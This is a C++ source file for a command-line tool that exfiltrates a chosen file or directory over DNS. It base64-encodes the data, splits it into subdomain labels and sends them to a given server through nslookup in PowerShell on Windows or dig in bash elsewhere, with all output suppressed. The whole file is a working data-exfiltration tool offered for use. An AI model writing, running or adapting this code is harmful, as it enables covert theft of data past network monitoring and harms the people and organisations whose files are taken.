#include <cstring>
#include <iostream>
#include <sys/stat.h>

using namespace std;

static bool startswith(const string& s, const string& prefix)
{
    return s.size() >= prefix.size() && s.compare(0, prefix.size(), prefix) == 0;
}

void error(string msg)
{
	cerr << "[-] Error: " << msg << endl;
	exit(1);
}

string getoutput(string cmd)
{
	FILE *pipe = popen(cmd.c_str(), "r");
	if (!pipe)
		error("Command execution failed.");

	char buf[1024];
	string res = "";
	while (!feof(pipe))
	{
		if(fgets(buf, 1024, pipe) != NULL)
			res += buf;
	}
	pclose(pipe);
	return res;
}

void usage(char *name)
{
	cout << "Usage: " << name << " <options>\n\n";
	cout << "Options\n";
	cout << "  -h, --help\t\tPrint this help message.\n";
	cout << "  -a, --address\t\tTarget server IP address.\n";
	cout << "  -b, --bytes\t\tBytes per data chunk. (default: 18 | max: 63)\n";
	cout << "  -s, --subdomains\tSubdomains per request. (default: 2 i.e. $data.$data.$file).\n";
	cout << "  -f, --file\t\tSingle file to transfer. (Should be present in current directory).\n";
	cout << "  -d, --directory\tEntire directory to transfer. (Should be present in current directory).\n";
	exit(0);
}

int main(int argc, char *argv[])
{
	int present = 0;
	int dir;
	string bytes = "18";
	string subdomains = "2";
	string res;
	string address = "";
	string payload;

	// arguments checking

	char *name;
#ifdef _WIN32
	(name = strrchr(argv[0], '\\')) ? ++name : (name = argv[0]);
#else
	(name = strrchr(argv[0], '/')) ? ++name : (name = argv[0]);
#endif

	if (argc < 5 || argc > 9)
		usage(name);

	for (int i = 0; i < argc; i++)
	{
		string tmp = argv[i];
		if (!tmp.compare("-h") || !tmp.compare("--help"))
			usage(name);

		else if (!tmp.compare("-a") || !tmp.compare("--address"))
		{
			if (!argv[i+1])
				error("-a/--address expected an ip address.");

			address = argv[i+1];
		}

		else if (!tmp.compare("-b") || !tmp.compare("--bytes"))
		{
			if (!argv[i+1])
				error("-b/--bytes expected an int argument.");

			if (stoi(argv[i+1]) < 1 || stoi(argv[i+1]) > 63)
				error("Bytes should be in range (1 - 63).");
			
			bytes = argv[i+1];
		}

		else if (!tmp.compare("-s") || !tmp.compare("--subdomains"))
		{
			if (!argv[i+1])
				error("-s/--subdomains expected an int argument.");

			if (stoi(bytes) * stoi(argv[i+1]) + 17 > 253)
				error("Please lessen the subdomain count.");
			
			subdomains = argv[i+1];
		}

		else if (!tmp.compare("-f") || !tmp.compare("--file"))
		{
			if (!argv[i+1])
				error("-f/--file expected a proper file.");

			struct stat sb;
			if (stat(argv[i+1], &sb) || !S_ISREG(sb.st_mode))
				error("File not found.");

			dir = 0;
			res = argv[i+1];
			present++;
		}

		else if (!tmp.compare("-d") || !tmp.compare("--directory"))
		{
			if (!argv[i+1])
				error("-d/--directory expected a proper directory.");

			struct stat sb;
			if (stat(argv[i+1], &sb) || !S_ISDIR(sb.st_mode))
				error("Directory not found.");

			dir = 1;
			res = argv[i+1];
			present++;
		}
	}
	if (present != 1)
		error("State a file or directory to transfer but not both together.");

	if (address == "")
		error("Please state the target server address.");

	if (startswith(res, ".\\"))
		res = res.substr(2);

	// main work

#ifdef _WIN32
	if (dir)
		payload = "powershell.exe -c \"$dir='" + res + "';$d='" + address + "';$s=" + subdomains + ";$b=" + bytes + ";ls $dir|Foreach-Object{$f=$_.Name;$p=[System.Convert]::ToBase64String([System.IO.file]::ReadAllbytes($_.FullName));$l=$p.Length;$r='';$n=0;while($n-le($l/$b)){$t=$b;if(($n*$b)+$t-gt$l){$t=$l-($n*$b)}$r+=$p.Substring($n*$b,$t)+'-.';if(($n%$s)-eq($s-1)){nslookup -type=A $r$f. $d;$r=''}$n+=1}nslookup -type=A $r$f. $d}>$null 2>$null\"";
	else
		payload = "powershell.exe -c \"$f='" + res + "';$d='" + address + "';$s=" + subdomains + ";$b=" + bytes + ";ls $f|foreach-object{$m=[system.convert]::tobase64string([system.io.file]::readallbytes($_.fullname));$l=$m.length;$r='';$n=0;while($n-le($l/$b)){$t=$b;if(($n*$b)+$t-gt$l){$t=$l-($n*$b);}$r+=$m.substring($n*$b,$t)+'-.';if(($n%$s)-eq($s-1)){nslookup -type=A $r$f. $d;$r=''}$n+=1}nslookup -type=A $r$f. $d}>$null 2>$null\"";

#else
	if (dir)
		payload = "bash -c 'for f in $(ls " + res + "); do s=" + subdomains + ";b=" + bytes + ";c=0; for r in $(for i in $(base64 -w0 $f | sed \"s/.\\{$b\\}/&\\n/g\");do if [[ \"$c\" -lt \"$s\"  ]]; then echo -ne \"$i-.\"; c=$(($c+1)); else echo -ne \"\\n$i-.\"; c=1; fi; done ); do dig @" + address + " `echo -ne $r$f|tr \"+\" \"*\"` +short; done ; done >&/dev/null'";
	else
		payload = "bash -c 'f=" + res + "; s=" + subdomains + ";b=" + bytes + ";c=0; for r in $(for i in $(base64 -w0 $f| sed \"s/.\\{$b\\}/&\\n/g\");do if [[ \"$c\" -lt \"$s\"  ]]; then echo -ne \"$i-.\"; c=$(($c+1)); else echo -ne \"\\n$i-.\"; c=1; fi; done ); do dig @" + address + " `echo -ne $r$f|tr \"+\" \"*\"` +short; done >& /dev/null'";

#endif
	getoutput(payload);
	return 0;
}
